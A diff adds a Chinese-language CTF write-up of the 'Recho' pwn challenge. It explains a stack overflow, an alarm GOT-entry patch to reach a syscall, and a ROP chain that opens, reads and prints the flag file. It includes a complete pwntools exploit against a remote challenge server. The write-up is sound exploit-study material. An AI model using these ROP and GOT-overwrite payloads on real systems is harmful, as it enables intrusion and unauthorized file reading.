@@ -1080,3 +1080,105 @@ data = sh.sendlineafter("exit\n", "5")
 print(data)
 sh.interactive()
 ```
+
+### Recho
+题目：暂无
+
+思路：看起来是一个很简单的栈溢出，但是难点在于如何使得main函数返回，从而劫持控制流。这里使用了pwntools提供的shutdown功能，可以关闭输入流，但是由于无法继续输入了，因此必须通过rop一次获取flag，而不能继续进入main函数输入其他信息了。
+
+由于只能关闭输入流才能劫持控制流，因此本题不能使用getshell的方式，而是使用了读文件的方式获取flag，并且本题正好提供了一个flag字符串，用于执行open函数。因此最终我们需要构造如下功能的shellcode：
+```c
+int fd = open("flag", READONLY);
+read(fd, buf, 100);
+printf(buf);
+```
+由于本程序已经导入了alarm，read，write，现在还缺少open函数。修改alarm函数got表的内容将其指向alarm函数中调用syscall的部分，然后通过rop控制syscall的相关参数即可手动实现open函数。查看下alarm函数的ida反汇编代码如下：
+```c
+.text:00000000000C0AC0 alarm           proc near               ; CODE XREF: lckpwdf+1AC↓p
+.text:00000000000C0AC0                                         ; lckpwdf+1F3↓p ...
+.text:00000000000C0AC0 ; __unwind {
+.text:00000000000C0AC0                 mov     eax, 25h ; '%'
+.text:00000000000C0AC5                 syscall                 ; LINUX - sys_alarm
+.text:00000000000C0AC7                 cmp     rax, 0FFFFFFFFFFFFF001h
+.text:00000000000C0ACD                 jnb     short loc_C0AD0
+.text:00000000000C0ACF                 retn
+```
+默认alarm的got表中保存的地址应该是libc基址+00000000000C0AC0，如果将这个地址往后偏移5个字节即可实现手动调用syscall了。不同libc版本偏移不一定都为5个字节，某些版本可能是7个字节或其他。要实现这个功能需要一个包含add指令的Gadget，使用ROPGadget搜索add|ret指令可以得到。
+```c
+0x000000000040070d : add byte ptr [rdi], al ; ret
+```
+只要设置al为5，rdi为alarm.got即可实现将alarm.got所指向的内容增加5个字节的偏移。现在梳理下rop调用链：
+
+1. 设置rdi为alarm.got
+pop rdi; ret
+2. 设置al为5
+pop rax; ret
+3. 修改got表
+add [rdi], al; ret
+4. 设置open的两个参数
+pop rdi; ret
+pop rsi; ret
+5. 设置eax为open函数的系统调用号
+pop rax; ret
+6. 设置read函数的3个参数
+pop rdi; ret
+pop rsi; ret // 没有这个Gadget，可以用pop rsi; pop r15; ret代替
+pop rdx; ret
+7. 设置printf函数的参数
+pop rdi; ret
+
+最终所需要的Gadget为
+```python
+0x00000000004006fc : pop rax ; ret
+0x00000000004008a3 : pop rdi ; ret
+0x00000000004006fe : pop rdx ; ret
+0x00000000004008a1 : pop rsi ; pop r15 ; ret
+0x000000000040070d : add byte ptr [rdi], al ; ret
+
+pop_rax = 0x4006fc
+pop_rdi = 0x4008a3
+pop_rdx = 0x4006fe
+pop_rsi_r15 = 0x4008a1
+add_rdi = 0x40070d
+```
+
+全部利用代码如下
+```python
+from pwn import *
+
+elf = ELF('773a2d87b17749b595ffb937b4d29936')
+sh = remote('220.249.52.133', 46624)
+
+data = sh.recvuntil('\n')
+log.info(data)
+
+# 覆盖缓冲区
+payload = b'A' * 0x38
+
+# gadget地址
+pop_rax = 0x4006fc
+pop_rdi = 0x4008a3
+pop_rdx = 0x4006fe
+pop_rsi_r15 = 0x4008a1
+add_rdi = 0x40070d
+
+# rop开始
+# 1. 修改got表
+payload += p64(pop_rdi) + p64(elf.got['alarm']) + p64(pop_rax) +  p64(5) + p64(add_rdi)
+# 2. open("flag", READONLY)
+# open的系统调用号为2
+# 这里最后虽然调用的是alarm函数，但是实际会跳转至syscall
+payload += p64(pop_rdi) + p64(next(elf.search(b'flag'))) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(pop_rax) + p64(2) +  p64(elf.plt['alarm'])
+# 3. read(3, buf, 100)
+# open打开文件默认从3开始
+# buf使用bss段数据
+payload += p64(pop_rdi) + p64(3) + p64(pop_rsi_r15) + p64(elf.bss() + 100) + p64(0) + p64(pop_rdx) + p64(100) + p64(elf.plt['read'])
+# 4. printf(buf)
+payload += p64(pop_rdi) + p64(elf.bss() + 100) + p64(elf.plt['printf'])
+
+print(payload)
+sh.sendline(str(0x200))
+sh.send(payload.ljust(0x200, b'\x00'))
+sh.shutdown('write')
+sh.interactive()
+```
